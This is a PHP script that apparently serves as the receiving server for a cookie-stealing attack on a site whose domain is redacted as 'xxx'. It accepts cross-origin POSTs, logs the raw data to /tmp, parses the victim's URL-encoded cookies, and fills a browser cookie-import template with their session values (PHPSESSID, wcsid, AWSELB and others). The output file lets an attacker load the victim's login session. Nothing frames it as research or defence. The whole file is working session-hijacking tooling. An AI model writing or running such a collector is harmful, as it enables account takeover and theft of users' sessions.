
<?php
header('Access-Control-Allow-Origin: https://xxx');
$postdata = file_get_contents("php://input");
file_put_contents("/tmp/post.log",$postdata);

$temp = explode("%3B+", substr($postdata, 7));

$cookies = array();
foreach ($temp as $t) {
	$cookie = explode("%3D", $t);
	$cookies[$cookie[0]] = $cookie[1];
}

file_put_contents("/tmp/cookies.log", print_r($cookies, true));

$cookieTemplate = <<<'EOT'
[
{
    "domain": "xxx",
    "hostOnly": true,
    "httpOnly": false,
    "name": "_ok",
    "path": "/",
    "secure": false,
    "session": true,
    "storeId": "0",
    "value": "%_ok%",
    "id": 1
},
{
    "domain": "xxx",
    "hostOnly": true,
    "httpOnly": false,
    "name": "_okbk",
    "path": "/",
    "secure": false,
    "session": true,
    "storeId": "0",
    "value": "%_okbk%",
    "id": 2
},
{
    "domain": "xxx",
    "hostOnly": true,
    "httpOnly": false,
    "name": "_oklv",
    "path": "/",
    "secure": false,
    "session": true,
    "storeId": "0",
    "value": "%_oklv%",
    "id": 3
},
{
    "domain": "xxx",
    "expirationDate": 1499999999,
    "hostOnly": true,
    "httpOnly": false,
    "name": "_pk_id.1.a57c",
    "path": "/",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "%_pk_id.1.a57c%",
    "id": 4
},
{
    "domain": "xxx",
    "expirationDate": 1499999999,
    "hostOnly": true,
    "httpOnly": false,
    "name": "_pk_ref.1.a57c",
    "path": "/",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "%_pk_ref.1.a57c%",
    "id": 5
},
{
    "domain": "xxx",
    "expirationDate": 1499999999,
    "hostOnly": true,
    "httpOnly": false,
    "name": "_pk_ses.1.a57c",
    "path": "/",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "%_pk_ses.1.a57c%",
    "id": 6
},
{
    "domain": "xxx",
    "expirationDate": 1499999999,
    "hostOnly": true,
    "httpOnly": false,
    "name": "AWSELB",
    "path": "/",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "%AWSELB%",
    "id": 7
},
{
    "domain": "xxx",
    "expirationDate": 1499999999,
    "hostOnly": true,
    "httpOnly": false,
    "name": "hblid",
    "path": "/",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "%hblid%",
    "id": 8
},
{
    "domain": "xxx",
    "expirationDate": 1499999999,
    "hostOnly": true,
    "httpOnly": false,
    "name": "olfsk",
    "path": "/",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": "%olfsk%",
    "id": 9
},
{
    "domain": "xxx",
    "hostOnly": true,
    "httpOnly": false,
    "name": "PHPSESSID",
    "path": "/",
    "secure": false,
    "session": true,
    "storeId": "0",
    "value": "%PHPSESSID%",
    "id": 10
},
{
    "domain": "xxx",
    "hostOnly": true,
    "httpOnly": false,
    "name": "wcsid",
    "path": "/",
    "secure": false,
    "session": true,
    "storeId": "0",
    "value": "%wcsid%",
    "id": 11
}
]
EOT;

foreach ($cookies as $name => $cookie) {
	$pattern = '/%' . $name . '%/';
	$replacement = $cookie;	
	$cookieTemplate = preg_replace($pattern, $replacement, $cookieTemplate);
}

file_put_contents("/tmp/" . time() . '-' . uniqid() . ".json", $cookieTemplate);
?>
